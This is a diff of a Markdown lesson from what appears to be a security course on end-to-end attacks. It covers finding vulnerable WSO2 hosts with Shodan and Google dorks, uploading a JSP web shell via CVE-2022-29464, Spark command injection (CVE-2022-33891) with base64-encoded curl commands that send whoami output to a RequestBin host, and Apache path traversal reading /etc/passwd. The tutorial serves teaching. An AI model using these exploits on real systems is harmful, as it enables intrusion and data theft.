@@ -3,6 +3,8 @@ linkTitle: 10. End-to-End Attack
 type: docs
 weight: 10
 ---
+# End to End Attacks
+
 ## Introduction
 
 There are multiple stages of a cyber attack: many of them contains five common stages used by a hacker to break into a system and also control it.
@@ -71,29 +73,30 @@ The attacker would change their MAC address and run the attacking machine throug
 ## How to find targets in the wild
 
 ### Find targets using shodan.io
+
 As presented to you in another session, **[shodan.io](https://www.shodan.io/dashboard)** is a powerful search engine that can help you to find vulnerable targets on the internet, using different search queries.
 A search query can contain, for example, the name of the product like a simple ```weblogic``` which represents the name of the WebLogic server developed by Oracle.
 
-<img src="../media/shodan_finding_1-2.png" width=800 height=400>
+![shodan_finding_1-2.png](../media/shodan_finding_1-2.png)
 
 But we can also use more specific queries to find targets that interest us. You can also specify the port numbers inside the shodan query, using the ```port:``` filter.
 Knowing that [WSO2](https://wso2.com) the default HTTP and HTTPS ports of a WSO2 product are 9763 and 9443 respectively, we can try to use the ```WSO2 port:9443,9763``` query, you can find some [WSO2](https://wso2.com) targets across the internet.
 
-<img src="../media/shodan_finding_2-2.png" width=800 height=400>
+![shodan_finding_2-2.png](../media/shodan_finding_2-2.png)
 
 Another way to find vulnerable targets is the **favicon hash**.
 Favicon is the shortand for favourite icon. It is used as a shortcut to other webpages.
 Browsers that use these icons usually display them in the address bar, as well as in the history.
 
-<img src="../media/favicon.png" width=474 height=142>
+![favicon.png](../media/favicon.png)
 
 You can find the favicon hash of an website, using the [FaviconHash website](https://faviconhash.com). For example, let's find out the favicon hash of the github.com website.
 
-<img src="../media/favicon_website.png" width=700 height=200>
+![favicon_website.png](../media/favicon_website.png)
 
 Now, we can use the ```http.favicon.hash:1848946384``` filter to find some GitHub based web-sites.
 
-<img src="../media/github_favicon.png" width=900 height=450>
+![github_favicon.png](../media/github_favicon.png)
 
 As you can see, we now have more than 700 results of potential vulnerable applications.
 Note that in order to use Shodan filters (http.favicon.hash) you must be logged in.
@@ -104,7 +107,7 @@ Google Dorks involves using advanced operators in the Google search engine to lo
 Common cases of using Google Dorks are finding specific versions of vulnerable Web applications.
 Taking the previous example, we want to find some vulnerable versions of the WSO2 product after the release of the [CVE-2022-29464](https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html) so we will use Google Dorks, knowing the vulnerable endpoints of the vulnerable product.
 
-```
+```text
 inurl:"/carbon/admin/login.jsp"
 inurl:"/authenticationendpoint/login.do"
 inurl:"devportal/apis"
@@ -112,7 +115,7 @@ intitle:"API Publisher- Login"
 intitle:"WSO2 Management Console"
 ```
 
-<img src="../media/google_dorks.png" width=800 height=500>
+![google_dorks.png](../media/google_dorks.png)
 
 ### Use automation to find vulnerable targets with Nuclei
 
@@ -128,9 +131,9 @@ Taking the same previous CVE-2022-29464 as an example, we can use our shodan.io 
 
 First we need to download the results of the [shodan search used for the WSO2 targets](https://www.shodan.io/search?query=WSO2+port%3A9443%2C9763): just press the Download Results button and wait for the ```.json.gz``` file to be downloaded then unzip it using ```gzip -d <finding>.json.gz```
 
-<img src="../media/shodan_download.png" width=800 height=150>
+![shodan_download.png](../media/shodan_download.png)
 
-<img src="../media/shodan_download_2.png" width=800 height=150>
+![shodan_download_2.png](../media/shodan_download_2.png)
 
 Our main interests of the ```<finding>.json.gz``` are the IP:PORT fields of every resulted information of the target; so the first approach is to extract these two fields, using [jq](https://stedolan.github.io/jq/) Linux utility - a sed for JSON data.
 
@@ -144,7 +147,7 @@ Another approach is to use the shodan [API](https://help.shodan.io/guides/how-to
 
 You can use the following commands to download the data:
 
-```
+```console
 shodan init <API_KEY>
 shodan count WSO2 port:9443,9763
 shodan download targets.json.gz WSO2 port:9443,9763 [--limit 1000]
@@ -164,7 +167,7 @@ After the installation is completed, as we said, we will choose to scan targets 
 
 We can see that our target was found vulnerable by nuclei.
 
-<img src="../media/nuclei_run.png">
+![nuclei_run](../media/nuclei_run.png)
 
 ## CVEs exploitation
 
@@ -200,13 +203,13 @@ So, the main idea is to send a **POST** request containing a web shell, which le
 
 First, turn on the Intercept and catch a request to the ```/carbon``` endpoint, using the Chromium browser. Access the ```https://<IP>:9443/carbon``` from the Chromium Browser.
 
-<img src="../media/browser_access.png" width=400 height=200>
+![browser_access.png](../media/browser_access.png)
 
-<img src="../media/burp_intercept_dark.png" width=800 height=400>
+![burp_intercept_dark.png](../media/burp_intercept_dark.png)
 
 Now, send the caught request to Repeater, using the **Ctrl+R** keyboard shortcut; this allows us to modify the request, trying to replicate the request that will succeed to our exploitation.
 
-<img src="../media/burp_repeater_dark.png" width=800 height=400>
+![burp_repeater_dark.png](../media/burp_repeater_dark.png)
 
 As we said before, we can upload any file on the WSO2 server -- we want a file that can interpret commands: we will try to upload a web shell jsp file with the following content:
 
@@ -241,12 +244,12 @@ if (request.getParameter("cmd") != null) {
 Let's modify the request and send a new request containing the web shell file having the name ```sss.jsp```.
 This file will be uploaded at the ```/authenticationendpoint/sss.jsp``` endpoint.
 
-<img src="../media/crafted_request.png" width=900 height=500>
+![crafted_request.png](../media/crafted_request.png)
 
 Right now we have an uploaded file situated on the ```https://<IP>:9443/authenticationendpoint/sss.jsp```.
 Accessing that web-page, we can see that we have a prompted form where we can insert commands.
 
-<img src="../media/passwd_file.png" width=600 height=300>
+![passwd_file.png](../media/passwd_file.png)
 
 ### CVE-2022-33891
 
@@ -258,7 +261,7 @@ The command injection occurs because Spark checks the group membership of the us
 
 The payload is pretty simple, you need to specify a command to run between the '`' characters, using the ```doAs``` parameter.
 
-```
+```console
 curl -X "GET" http://<IP>:8080/?doAs=`<command_to_execute>`
 ```
 
@@ -270,31 +273,31 @@ To read the output of the command and to check if that command was executed on t
 
 You need just to create a subdomain by using the Create a RequestBin button:
 
-<img src="../media/requestbin.png" width=600 height=300>
+![requestbin.png](../media/requestbin.png)
 
 Now you have an associated URL to your request bin and you can send requests to this URL getting all that information needed:
 
-```
+```console
 curl <REQUEST-BIN-URL>
 ```
 
-<img src="../media/requestbin2.png" width=800 height=400>
+![requestbin2.png](../media/requestbin2.png)
 
 To check if the server is vulnerable and the command was successfully executed, we would like the target server to communicate with our created logger: we will make the target to send a GET request to our REQUEST-BIN-URL.
 We will introduce a curl command inside the backticks that we discussed before.
 
 But first, we will encode it with base64 inside the URL and then execute it using bash command.
 
-```
+```console
 echo -n "curl <REQUEST-BIN-URL>" | base64
 curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
 ```
 
-<img src="../media/simplecurl.png" width=800 height=90>
+![simplecurl.png](../media/simplecurl.png)
 
 We can spot two GET requests as we have talked before: one request sent by our shell because of the backticks and another one interpreted by the target shell, meaning that the target is vulnerable.
 
-<img src="../media/requestbinget.png" width=700 height=50>
+![requestbinget.png](../media/requestbinget.png)
 
 But we will to extract some system information from the target, so we will try to execute a command and send it with curl. The ```-d``` parameter of curl will specify that we send a request with some data in it: that will be the output of the ```whoami``` command.
 
@@ -306,17 +309,16 @@ import base64
 base64.b64encode(b'curl -d $(whoami) <REQUEST-BIN-URL>')
 ```
 
-<img src="../media/python_encode.png" width=550 height=50>
+![python_encode.png](../media/python_encode.png)
 
-
-```
+```console
 curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
 ```
 
 We can see that we have got two GET requests in our Request Bin logger.
 One of this contains the target username:
 
-<img src="../media/username.png" width=850 height=400>
+![username.png](../media/username.png)
 
 ### CVE-2021-41773
 
@@ -327,11 +329,11 @@ The affected versions of Apache were Apache 2.4.49 & 2.4.50.
 Path normalization mechanism of Apache HTTP Server 2.4.49, it does not properly neutralize sequences such as ".." so this will result in accessing files outside the current directory.
 Using the ```%2e``` (which is the URL encoding of '.') inside the target URL, we can successfully run a path traversal attack:
 
-```
+```console
 curl http://<IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
 ```
 
-<img src="../media/path_traversal.png" width=600 height=250>
+![path_traversal.png](../media/path_traversal.png)
 
 ## Further reading
 
